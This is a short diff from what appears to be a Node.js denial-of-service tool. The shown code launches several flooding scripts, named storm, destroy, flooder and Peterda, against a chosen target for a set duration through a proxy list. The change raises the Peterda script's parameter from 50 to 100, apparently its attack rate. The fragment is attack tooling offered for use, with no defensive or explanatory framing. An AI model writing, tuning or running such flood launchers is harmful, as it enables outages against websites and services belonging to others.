@@ -333,7 +333,7 @@ const peterda = path.join(__dirname, `/lib/cache/Peterda.js`);
 	exec(`node ${storm} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${destroy} ${target} ${duration} 100 100 proxy.txt`)
 	exec(`node ${flooder} ${target} ${duration} 100 100 proxy.txt`)
-	exec(`node ${peterda} ${target} ${duration} 50 100 proxy.txt`)
+	exec(`node ${peterda} ${target} ${duration} 100 100 proxy.txt`)
 	  
 	  
           sigma()
